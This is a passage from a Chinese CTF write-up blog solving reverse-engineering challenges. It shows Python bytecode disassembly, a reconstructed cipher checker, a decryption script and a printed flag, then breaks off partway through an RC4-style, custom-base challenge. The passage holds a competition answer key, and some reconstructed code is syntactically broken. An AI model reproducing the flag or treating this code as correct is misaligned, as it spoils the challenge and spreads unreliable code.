class="line">            <span class="number">110</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">            <span class="number">112</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">114</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">116</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">            <span class="number">118</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="number">120</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">122</span> BINARY_SUBTRACT</span><br><span class="line">            <span class="number">124</span> LOAD_FAST                <span class="number">1</span> (R)</span><br><span class="line">            <span class="number">126</span> BINARY_ADD</span><br><span class="line">            <span class="number">128</span> LOAD_CONST               <span class="number">3</span> (<span class="number">26</span>)</span><br><span class="line">            <span class="number">130</span> BINARY_MODULO</span><br><span class="line">            <span class="number">132</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">            <span class="number">134</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="number">136</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">138</span> BINARY_ADD</span><br><span class="line">            <span class="number">140</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">142</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">144</span> POP_TOP</span><br><span class="line">            <span class="number">146</span> JUMP_ABSOLUTE            <span class="number">8</span></span><br><span class="line"></span><br><span class="line"> <span class="number">21</span>     &gt;&gt;  <span class="number">148</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="number">150</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">152</span> DUP_TOP</span><br><span class="line">            <span class="number">154</span> ROT_THREE</span><br><span class="line">            <span class="number">156</span> COMPARE_OP               <span class="number">1</span> (&lt;=)</span><br><span class="line">            <span class="number">158</span> POP_JUMP_IF_FALSE      <span class="number">168</span></span><br><span class="line">            <span class="number">160</span> LOAD_CONST               <span class="number">7</span> (<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">            <span class="number">162</span> COMPARE_OP               <span class="number">1</span> (&lt;=)</span><br><span class="line">            <span class="number">164</span> POP_JUMP_IF_FALSE      <span class="number">216</span></span><br><span class="line">            <span class="number">166</span> JUMP_FORWARD             <span class="number">4</span> (to <span class="number">172</span>)</span><br><span class="line">        &gt;&gt;  <span class="number">168</span> POP_TOP</span><br><span class="line">            <span class="number">170</span> JUMP_FORWARD            <span class="number">44</span> (to <span class="number">216</span>)</span><br><span class="line"></span><br><span class="line"> <span class="number">22</span>     &gt;&gt;  <span class="number">172</span> LOAD_FAST                <span class="number">2</span> (result)</span><br><span class="line">            <span class="number">174</span> LOAD_METHOD              <span class="number">0</span> (append)</span><br><span class="line">            <span class="number">176</span> LOAD_GLOBAL              <span class="number">1</span> (<span class="built_in">chr</span>)</span><br><span class="line">            <span class="number">178</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">            <span class="number">180</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">182</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">184</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">            <span class="number">186</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="number">188</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">190</span> BINARY_SUBTRACT</span><br><span class="line">            <span class="number">192</span> LOAD_FAST                <span class="number">1</span> (R)</span><br><span class="line">            <span class="number">194</span> BINARY_ADD</span><br><span class="line">            <span class="number">196</span> LOAD_CONST               <span class="number">8</span> (<span class="number">10</span>)</span><br><span class="line">            <span class="number">198</span> BINARY_MODULO</span><br><span class="line">            <span class="number">200</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">            <span class="number">202</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="number">204</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">206</span> BINARY_ADD</span><br><span class="line">            <span class="number">208</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">210</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">212</span> POP_TOP</span><br><span class="line">            <span class="number">214</span> JUMP_ABSOLUTE            <span class="number">8</span></span><br><span class="line"></span><br><span class="line"> <span class="number">24</span>     &gt;&gt;  <span class="number">216</span> LOAD_FAST                <span class="number">2</span> (result)</span><br><span class="line">            <span class="number">218</span> LOAD_METHOD              <span class="number">0</span> (append)</span><br><span class="line">            <span class="number">220</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">222</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">224</span> POP_TOP</span><br><span class="line">            <span class="number">226</span> JUMP_ABSOLUTE            <span class="number">8</span></span><br><span class="line"></span><br><span class="line"> <span class="number">25</span>     &gt;&gt;  <span class="number">228</span> LOAD_CONST               <span class="number">9</span> (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="number">230</span> LOAD_METHOD              <span class="number">3</span> (join)</span><br><span class="line">            <span class="number">232</span> LOAD_FAST                <span class="number">2</span> (result)</span><br><span class="line">            <span class="number">234</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">236</span> RETURN_VALUE</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def test2(s2):</span><br><span class="line">	key = &#x27;SYC&#x27;</span><br><span class="line">	length = 18</span><br><span class="line">	cipher = []</span><br><span class="line">	for i in range(length):</span><br><span class="line">		cipher.append( (ord(s2[i])^i)+((~ord(key[i % 3]+1)))</span><br><span class="line">	</span><br><span class="line">    return cipher</span><br><span class="line"></span><br><span class="line">def test(R,s):</span><br><span class="line">	result = []</span><br><span class="line">    for i in s:</span><br><span class="line">    	if &#x27;A&#x27; &lt;= i:</span><br><span class="line">    		if i &lt;= &#x27;Z&#x27;:</span><br><span class="line">    			result.append(chr((ord(i)-ord(&#x27;A&#x27;)+R)%26)+ord(&#x27;A&#x27;)))</span><br><span class="line">    	if &#x27;a&#x27; &lt;= i:</span><br><span class="line">    		if i &lt;=&#x27;z&#x27;:</span><br><span class="line">    			result.append(chr( ( (ord(i) - ord(&#x27;a&#x27;) + R ) %26 ) + ord(&#x27;a&#x27;)))</span><br><span class="line">    	if &#x27;0&#x27; &lt;= i:</span><br><span class="line">    		if i &lt;= &#x27;9&#x27;:</span><br><span class="line">    			result.append(chr( (ord(i)-ord(&#x27;0&#x27;)+R)%10+ord(&#x27;0&#x27;)))</span><br><span class="line">    	else:</span><br><span class="line">    		result.append(i)</span><br><span class="line">    	return &#x27;&#x27;.join(result)</span><br></pre></td></tr></table></figure>
<ul>
<li>然后接下来就是程序顺序执行的地方</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241104190420034.png" alt="image-20241104190420034"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">flag = &#x27;SYC&#123;MD5(input)&#125;&#x27;</span><br><span class="line">print(&#x27;Please input:&#x27;)</span><br><span class="line">input0 = &#x27;&#x27;</span><br><span class="line">a = 13</span><br><span class="line">b = 14</span><br><span class="line">c = (b+a) ^ a</span><br><span class="line">d = b*100</span><br><span class="line">e = a ^ b</span><br><span class="line">m = d - 4*c  + e - 1</span><br><span class="line">r = m % 26</span><br><span class="line">cipher1 = test(r,input0)</span><br><span class="line">cipher2 = test2(cipher1)</span><br><span class="line">num = [-1,-36,26,-5,14,41,6,-9,60,29,-28,17,21,7,35,38,26,48]</span><br><span class="line">for i in range(18):</span><br><span class="line">	if cipher2[i] != num[i]:</span><br><span class="line">		 print(&#x27;wrong&#x27;)</span><br><span class="line">	else:</span><br><span class="line">		print(&#x27;Rrrright!&#x27;)</span><br></pre></td></tr></table></figure>
<ul>
<li>所以整个程序如下所示：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>(<span class="params">s2</span>):</span><br><span class="line">	key = <span class="string">&#x27;SYC&#x27;</span></span><br><span class="line">	length = <span class="number">18</span></span><br><span class="line">	cipher = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">		cipher.append( (<span class="built_in">ord</span>(s2[i])^i)+((~<span class="built_in">ord</span>(key[i % <span class="number">3</span>]+<span class="number">1</span>)))</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">R,s</span>):</span><br><span class="line">	result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    	<span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= i:</span><br><span class="line">    		<span class="keyword">if</span> i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">    			result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)+R)%<span class="number">26</span>)+<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">    	<span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= i:</span><br><span class="line">    		<span class="keyword">if</span> i &lt;=<span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">    			result.append(<span class="built_in">chr</span>( ( (<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + R ) %<span class="number">26</span> ) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">    	<span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> &lt;= i:</span><br><span class="line">    		<span class="keyword">if</span> i &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">    			result.append(<span class="built_in">chr</span>( (<span class="built_in">ord</span>(i)-<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)+R)%<span class="number">10</span>+<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line">    	<span class="keyword">else</span>:</span><br><span class="line">    		result.append(i)</span><br><span class="line">    	<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line">flag = <span class="string">&#x27;SYC&#123;MD5(input)&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Please input:&#x27;</span>)</span><br><span class="line">input0 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">a = <span class="number">13</span></span><br><span class="line">b = <span class="number">14</span></span><br><span class="line">c = (b+a) ^ a</span><br><span class="line">d = b*<span class="number">100</span></span><br><span class="line">e = a ^ b</span><br><span class="line">m = d - <span class="number">4</span>*c  + e - <span class="number">1</span></span><br><span class="line">r = m % <span class="number">26</span></span><br><span class="line">cipher1 = test(r,input0)</span><br><span class="line">cipher2 = test2(cipher1)</span><br><span class="line">num = [-<span class="number">1</span>,-<span class="number">36</span>,<span class="number">26</span>,-<span class="number">5</span>,<span class="number">14</span>,<span class="number">41</span>,<span class="number">6</span>,-<span class="number">9</span>,<span class="number">60</span>,<span class="number">29</span>,-<span class="number">28</span>,<span class="number">17</span>,<span class="number">21</span>,<span class="number">7</span>,<span class="number">35</span>,<span class="number">38</span>,<span class="number">26</span>,<span class="number">48</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">	<span class="keyword">if</span> cipher2[i] != num[i]:</span><br><span class="line">		 <span class="built_in">print</span>(<span class="string">&#x27;wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;Rrrright!&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>程序逻辑就是先经过凯撒加密后经过一个不知道什么加密的，然后得到密文</p>
</li>
<li>
<p>接下来写解密脚本,这里注意一下，在num这个列表是<code>[-1,-36,26,-5,14,41,6,-9,60,29,-28,17,21,7,35,38,26,48]</code>而不是从48开始。</p>
</li>
<li>
<p>接下来解密脚本：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">num1 = [-<span class="number">1</span>,-<span class="number">36</span>,<span class="number">26</span>,-<span class="number">5</span>,<span class="number">14</span>,<span class="number">41</span>,<span class="number">6</span>,-<span class="number">9</span>,<span class="number">60</span>,<span class="number">29</span>,-<span class="number">28</span>,<span class="number">17</span>,<span class="number">21</span>,<span class="number">7</span>,<span class="number">35</span>,<span class="number">38</span>,<span class="number">26</span>,<span class="number">48</span>]</span><br><span class="line">a = <span class="number">13</span></span><br><span class="line">b = <span class="number">14</span></span><br><span class="line">c = (b + a) ^ a</span><br><span class="line">d = b * <span class="number">100</span></span><br><span class="line">e = a ^ b</span><br><span class="line">m = d - <span class="number">4</span> * c + e - <span class="number">1</span></span><br><span class="line">r = m % <span class="number">26</span></span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line">key = <span class="string">&#x27;SYC&#x27;</span></span><br><span class="line"><span class="comment">#cipher.append((ord(s2[i]) ^ i) + ((~ord(key[i%3])+1)))</span></span><br><span class="line">c = []</span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    a = num[i] - ((~<span class="built_in">ord</span>(key[i%<span class="number">3</span>]))+<span class="number">1</span>)</span><br><span class="line">    c.append(<span class="built_in">chr</span>(a^i))</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    a = num1[i] - ((~<span class="built_in">ord</span>(key[i%<span class="number">3</span>]))+<span class="number">1</span>)</span><br><span class="line">    d.append(<span class="built_in">chr</span>(a^i))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(d))</span><br><span class="line">e = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= i:</span><br><span class="line">        <span class="keyword">if</span> i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            e+= <span class="built_in">chr</span>((((<span class="built_in">ord</span>(i)-<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - r)%<span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= i:</span><br><span class="line">        <span class="keyword">if</span> i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            e+=<span class="built_in">chr</span>(((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - r) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> &lt;= i:</span><br><span class="line">        <span class="keyword">if</span> i &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            e+=<span class="built_in">chr</span>(((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - r) % <span class="number">10</span> )+ <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        e+=i</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="comment"># D0YouIik3python</span></span><br><span class="line"><span class="comment"># 我写的脚本还有点问题，最后再加上下滑线即可</span></span><br><span class="line"><span class="comment"># D0_You_Iik3_python</span></span><br><span class="line"><span class="comment"># 然后按照要求SYC&#123;md5&#123;input&#125;&#125;</span></span><br><span class="line"><span class="comment"># 最后flag：SYC&#123;ed798fdd74e5c382b9c7fcca88500aca&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="贝斯贝斯"><a class="markdownIt-Anchor" href="#贝斯贝斯"></a> 贝斯！贝斯！</h2>
<ul>
<li>逆向顺序</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_4018FF-----&gt;sub_4019EE------&gt;sub_401AF6-----&gt;sub_401C6A</span><br></pre></td></tr></table></figure>
<ul>
<li>打开附件查看main函数，看到这一部分与加密有关</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115224747244.png" alt="image-20241115224747244"></p>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115224800134.png" alt="image-20241115224800134"></p>
<ul>
<li>之后再查看<code>sub_401C6A</code>函数，查看该函数后发现要进行逆向得先逆向这个函数里面的部分</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115224907464.png" alt="image-20241115224907464"></p>
<ul>
<li>然后再打开这个逆向我们要先逆向这里面的函数</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115224941817.png" alt="image-20241115224941817"></p>
<ul>
<li>所以我们先要逆向这个位置</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115225002210.png" alt="image-20241115225002210"></p>
<ul>
<li>逆向过程,这一部分逆向出来了</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;RjB6Myu#,&gt;Bgoq&amp;u.H(nBgdIaOKJbgEYj1GR4S.w&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;happy_happy&#x27;</span></span><br><span class="line">num = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line"><span class="comment"># 求解1,先利用key求与c加密有关的</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deckey1</span>(<span class="params">key,num</span>):</span><br><span class="line">    v5 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        v5 = ( (<span class="built_in">ord</span>(key[j%<span class="built_in">len</span>(key)]) + v5 + num[j])%<span class="number">256</span> )</span><br><span class="line">        v4 = num[j]</span><br><span class="line">        num[j] = num[v5]</span><br><span class="line">        num[v5] = v4</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line">deckey1(key,num)</span><br><span class="line"><span class="comment"># [104, 202, 195, 13, 75, 94, 254, 140, 26, 182, 218, 232, 186, 55, 181, 167, 5, 145, 148, 46, 229, 43, 171, 35, 36, 52, 199, 57, 67, 59, 201, 147, 241, 183, 243, 132, 22, 219, 39, 14, 62, 215, 113, 250, 15, 137, 149, 124, 221, 174, 102, 192, 108, 223, 196, 175, 156, 88, 119, 84, 38, 227, 2, 93, 200, 206, 120, 123, 135, 136, 208, 234, 114, 184, 6, 185, 126, 48, 160, 95, 216, 233, 72, 118, 211, 150, 240, 7, 33, 80, 157, 180, 193, 100, 144, 176, 78, 92, 30, 252, 115, 45, 17, 130, 205, 178, 125, 63, 79, 117, 163, 23, 21, 74, 203, 230, 165, 16, 111, 190, 245, 214, 107, 189, 25, 53, 166, 164, 96, 188, 68, 20, 86, 8, 244, 73, 34, 12, 89, 77, 50, 198, 121, 170, 172, 37, 27, 138, 158, 168, 251, 238, 194, 212, 179, 253, 209, 49, 210, 143, 69, 109, 217, 236, 71, 11, 204, 177, 173, 207, 85, 141, 9, 3, 98, 0, 105, 41, 197, 97, 129, 235, 213, 122, 70, 24, 247, 112, 47, 110, 220, 18, 155, 226, 231, 60, 103, 40, 44, 222, 116, 65, 154, 90, 248, 153, 242, 127, 142, 10, 66, 31, 225, 87, 82, 61, 239, 128, 101, 162, 249, 134, 81, 255, 19, 146, 4, 76, 64, 191, 187, 169, 139, 237, 228, 58, 91, 1, 159, 246, 54, 151, 161, 51, 32, 106, 99, 56, 28, 83, 29, 131, 42, 133, 224, 152]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>然后再逆向这个函数<code>sub_4019EE</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deckey2</span>(<span class="params">num1</span>):</span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    v7 = <span class="number">0</span></span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">85</span>):</span><br><span class="line">        v7 = (v7 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        v6 = (num1[v7] + v6 ) % <span class="number">256</span></span><br><span class="line">        v4 = num1[v7]</span><br><span class="line">        num1[v7] = num1[v6]</span><br><span class="line">        num1[v6] = v4</span><br><span class="line">        <span class="built_in">list</span>.append(num1[ (num1[v7]+num1[v6])%<span class="number">256</span> ])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">deckey2(num1)</span><br><span class="line">num2 = [<span class="number">115</span>, <span class="number">12</span>, <span class="number">155</span>, <span class="number">218</span>, <span class="number">128</span>, <span class="number">248</span>, <span class="number">219</span>, <span class="number">60</span>, <span class="number">26</span>, <span class="number">194</span>, <span class="number">194</span>, <span class="number">159</span>, <span class="number">167</span>, <span class="number">221</span>, <span class="number">105</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">187</span>, <span class="number">1</span>, <span class="number">66</span>, <span class="number">36</span>, <span class="number">110</span>, <span class="number">14</span>, <span class="number">161</span>, <span class="number">150</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">99</span>, <span class="number">227</span>, <span class="number">30</span>, <span class="number">69</span>, <span class="number">59</span>, <span class="number">114</span>, <span class="number">66</span>, <span class="number">209</span>, <span class="number">168</span>, <span class="number">221</span>, <span class="number">174</span>, <span class="number">216</span>, <span class="number">200</span>, <span class="number">56</span>, <span class="number">210</span>, <span class="number">35</span>, <span class="number">197</span>, <span class="number">226</span>, <span class="number">222</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">156</span>, <span class="number">132</span>, <span class="number">135</span>, <span class="number">226</span>, <span class="number">226</span>, <span class="number">110</span>, <span class="number">69</span>, <span class="number">253</span>, <span class="number">42</span>, <span class="number">101</span>, <span class="number">157</span>, <span class="number">6</span>, <span class="number">80</span>, <span class="number">129</span>, <span class="number">238</span>, <span class="number">32</span>, <span class="number">67</span>, <span class="number">86</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">14</span>, <span class="number">162</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">245</span>, <span class="number">163</span>, <span class="number">4</span>, <span class="number">98</span>, <span class="number">146</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">207</span>, <span class="number">140</span>, <span class="number">253</span>, <span class="number">142</span>, <span class="number">144</span>, <span class="number">21</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>接下来就需要逆向<code>sub_401AF6</code>这个函数，这一部分逆向后代码如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deckey3</span>(<span class="params">num2</span>):</span><br><span class="line">    str_base = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">    base1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    v5 = [m-m <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">88</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span 